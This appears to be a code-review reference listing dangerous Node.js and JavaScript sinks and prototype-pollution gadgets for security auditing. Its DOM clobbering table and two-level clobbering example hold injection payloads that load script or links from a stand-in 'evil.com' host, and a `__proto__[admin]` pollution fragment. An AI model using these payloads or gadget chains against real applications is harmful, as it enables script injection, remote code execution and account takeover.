# Node.js / JavaScript Sinks

---

## RCE

`child_process.exec/execSync/spawn/spawnSync/fork()`, `vm.runInNewContext/runInThisContext/Script()`, `new Function()`, `eval()`, `setTimeout/setInterval(string)`, `require('child_process')`, `process.binding('spawn_sync')`

---

## Deserialization

`node-serialize` (`unserialize()` with `_$$ND_FUNC$$_`), `funcster`, `cryo`, `serialize-javascript`, `js-yaml` (older versions with `!!js/function`)

---

## Prototype Pollution

`lodash.merge/set/defaultsDeep()`, `jQuery.extend(true,...)`, `hoek.merge()`, `deep-extend`, `defaults-deep`, `destr()`, manual recursive merge without hasOwnProperty check, `qs` library nested parsing, `JSON.parse()` + naive merge, `constructor.prototype` key (bypasses `__proto__` filters), URL fragment: `#__proto__[admin]=1` (client-side)

---

## SSRF

`http.get/request()`, `https.get/request()`, `axios`, `got`, `node-fetch`, `request` (deprecated), `needle`, `superagent`, `undici`

---

## Path Traversal

`fs.readFile/readFileSync()`, `fs.writeFile/writeFileSync()`, `path.join()` (does NOT sanitize `..`), `path.resolve()`, `res.sendFile()`, `express.static()`

---

## Additional Node.js Sinks

- **SQLi:** `mysql.query()` / `mysql2` with string concat, `sequelize.query()` with raw SQL, `knex.raw()`, `pg` `client.query()` with string interpolation
- **XSS:** `res.send()` with unsanitized user input, `innerHTML` assignments in SSR (Next.js, Nuxt), `dangerouslySetInnerHTML` in React SSR
- **`commonmark`/`marked`/`remark` → `dangerouslySetInnerHTML` without `sanitize-html`**: `new commonmark.HtmlRenderer().render(parser.parse(body))` returns raw HTML — any `<script>`, `<iframe>`, `on*=` attribute, `javascript:` URL in a commonmark extension flows through. A sanitize-html pass is mandatory; its absence is a finding regardless of whether the input is "trusted user content" (moderator views render other users' content).
- **NoSQL Injection:** `mongoose.find()` / `findOne()` with `$gt`, `$ne`, `$regex` from req.body, `mongodb` native driver with unsanitized query objects
- **ReDoS:** `new RegExp(user_input)`, `String.prototype.match()` / `.replace()` / `.search()` with user-controlled patterns
- **Module injection:** `require(userInput)` — dynamic module loading with attacker-controlled path; can load arbitrary native addons or reach `node_modules` gadgets
- **Prototype pollution via parse+merge:** `JSON.parse(userInput)` result spread/merged without sanitization introduces `__proto__` keys; pair with any recursive merge utility
- **WebSocket URL poisoning:** `new WebSocket(userInput)` — attacker controls WS endpoint, enables data exfiltration or connection to malicious server
- **Cookie injection / session fixation:** `document.cookie = userInput` — unsanitized value can set arbitrary cookies including `session` or `auth` tokens
- **WebSQL (deprecated, still present in Chromium-based apps):** `db.executeSql(userInput)` — SQL injection in client-side SQLite
- **Storage-based persistent XSS:** `localStorage.setItem(key, userInput)` — benign on write but creates a persistent XSS source if the stored value is later read and rendered unsanitized into the DOM
- **`window.location.replace(osUrl)` from a native deep-link handler**: Tauri `onOpenUrl`, Electron `app.on('open-url', ...)`, and mobile custom-scheme intents deliver an arbitrary URL to renderer JS. Any `location.replace(urls[0])` or `location.href = urls[0]` without scheme/host validation means the SPA router receives attacker-controlled query params (`loginToken`, OAuth `code`/`state`, feature-flag overrides). Must validate scheme is the app's own, host matches an allowlist, and no `loginToken` / auth-completion param is respected from deep-link origin.

---

## IPC / postMessage Sinks

- **`window.postMessage(data, "*")`** — wildcard target origin delivers `data` to every frame in the window. Anything sensitive (auth state, recovery key, IPC relay tokens) leaks to every iframe. Treat the second argument as a data-exfil parameter: if it is `"*"`, a dynamic variable, or any non-literal string, the call is a sink. Correct form is a literal origin constant (`window.location.origin`, a hardcoded `"https://trusted.example"`).

---

## DOM Clobbering Sinks

HTML elements with `id` or `name` attributes create global variables that can override JavaScript properties. These are exploitable when user-controlled HTML is rendered (even after sanitization, since named elements are usually allowed).

**High-value clobbering targets:**

| Sink | Clobbering Payload | Impact |
|------|-------------------|--------|
| `document.currentScript.src` | `<img name="currentScript" src="//evil.com/x.js">` | Library loads from attacker URL → XSS |
| `document.scripts` | `<img name="scripts">` | Breaks `document.scripts` iteration, enables injection |
| `document.getElementById()` | `<form id="target"><input name="value" value="evil">` | Returns attacker-controlled element |
| `window.someGlobal` | `<a id="someGlobal" href="//evil.com">` | Override global vars; `toString()` returns href |
| `element.attributes` | `<form onclick=alert(1)><input id="attributes">` | Sanitizer bypass — `attributes` no longer NamedNodeMap |
| `document.cookie` | `<img name="cookie">` | Breaks cookie-reading code, potential auth bypass |
| `document.body` | `<img name="body">` | Breaks `document.body.appendChild()` and similar |

**Two-level property clobbering:**
`<a id="x"><a id="x" name="y" href="//evil.com">` → `x.y` returns the href string

**Three-level property clobbering:**
`<form id="x" name="y"><input id="z" value="controlled">` → `x.y.z.value`

**Affected libraries (CVEs):**
- Vite (CVE-2024-45812), Webpack (CVE-2024-43788), Astro (CVE-2024-47885), Rollup, Prism.js, MathJax, FilePond

**Detection:** Search for `document.currentScript`, `document.scripts`, or any `document.*` property access that could be clobbered by HTML injection. Run in context where user HTML is rendered.

---

## Global window Bindings as XSS-to-ATO Amplifiers

- **Global mutable window bindings exporting privileged functions** (`window.mxLoginWithAccessToken`, `window.__APP_STATE__`, `window.store`, `window.debugClient`): grep for `window\.\w\+ = ` outside vendor files. Every privileged function on `window` is an XSS-to-full-capability amplifier and converts otherwise-Medium XSS into Critical ATO. Dev-only debugging hooks must be stripped at build (`if (process.env.NODE_ENV === 'development')` gate verified in the production bundle).

---

## Prototype Pollution Gadgets — Extended

**jQuery gadgets:**
- `$.fn.tooltip` defaults → XSS via `template` or `title` property pollution
- `$.ajaxSetup` → pollute `url`, `headers`, or `data` to hijack all future AJAX requests

**Axios gadgets:**
- `axios.defaults.headers.common` → inject auth headers into all requests
- `axios.defaults.baseURL` → redirect all API calls to attacker server

**Express.js response gadgets:**
- `Object.prototype.outputFunctionName` → EJS RCE (well-known)
- `Object.prototype.escapeFunction` → EJS RCE (alternative path)
- `Object.prototype.compileDebug` → Pug debug mode injection
- `Object.prototype.self` → Pug code injection
- `Object.prototype.block` → Pug RCE via block override

**Lodash/Underscore template gadgets:**
- `_.template` with `variable` property polluted → template compilation RCE
- `_.defaults` / `_.defaultsDeep` as pollution entry point + `_.template` as gadget

**React/Next.js gadgets:**
- `dangerouslySetInnerHTML` via polluted props → XSS
- Server Component prop deserialization → potential RCE (React2Shell, CVE-2025-55182)

---

## React Security-UX Anti-patterns

- **Security-warning dialog computed in `componentDidMount` via instance-field mutation**: `componentDidMount() { this.currentRoomType = computeType() }` followed by `render() { return this.currentRoomType === X ? <Warn/> : <OK/> }` — the first render runs before `componentDidMount`, so the warning is blank / stale on the initial paint. Users who click through fast (Enter, auto-focus) never see the warning. Any dialog gating a destructive action on `this.<field>` set outside `setState` / props is suppressing its own security prompt. Equivalent hook-era bug: `useEffect(() => { ref.current = ... }, [])` read during render.
